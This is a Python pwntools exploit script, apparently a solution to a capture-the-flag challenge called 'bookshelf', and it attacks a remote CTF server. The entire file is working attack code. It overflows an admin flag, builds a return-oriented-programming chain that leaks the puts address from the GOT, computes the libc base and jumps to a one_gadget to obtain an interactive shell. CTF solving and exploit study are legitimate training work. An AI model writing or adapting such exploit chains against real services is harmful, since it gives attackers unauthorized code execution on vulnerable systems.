#!/usr/bin/python3
from pwn import *

#p = process('./bookshelf.bin')

'''
p = gdb.debug('./bookshelf.bin', """
  b *0x40148d
  continue       
""")
'''


p = remote('chal.pctf.competitivecyber.club', 8989)

data_section = 0x404100

def get_puts():
    ''''''
    pop_rdi = 0x40101c
    puts_got = 0x404020
    puts_plt = 0x4010c0
    main = 0x40148f

    p.recvuntil('out')
    p.sendline('3')

    payload = b'A'*48
    payload += p64(data_section)
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)

    p.sendline(payload)
    data = p.recvuntil('out')
    data = p.recvuntil('Welcome')
    data = data.split(b'\n')[4]
    puts_addr = u64(data.ljust(8, b'\x00'))
    return puts_addr

def overflow_admin():
    p.recvuntil('out')
    p.sendline('1')
    p.recvline()
    p.sendline('y')
    p.sendline(b'\x01'*40)

def get_shell(puts: int):
    libc_base = puts - 0x80ed0
    one_gadget = libc_base + 0xebcf8
    pop_rsi = libc_base + 0x126101
    pop_rdx_rbx = libc_base + 0x90529

    p.recvuntil('out')
    p.sendline('3')

    payload = b'A'*48
    payload += p64(data_section)
    payload += p64(pop_rsi)
    payload += p64(0x0)
    payload += p64(pop_rdx_rbx)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(one_gadget)
    p.sendline(payload)

    
overflow_admin()
puts = get_puts()
overflow_admin()
get_shell(puts)

p.interactive()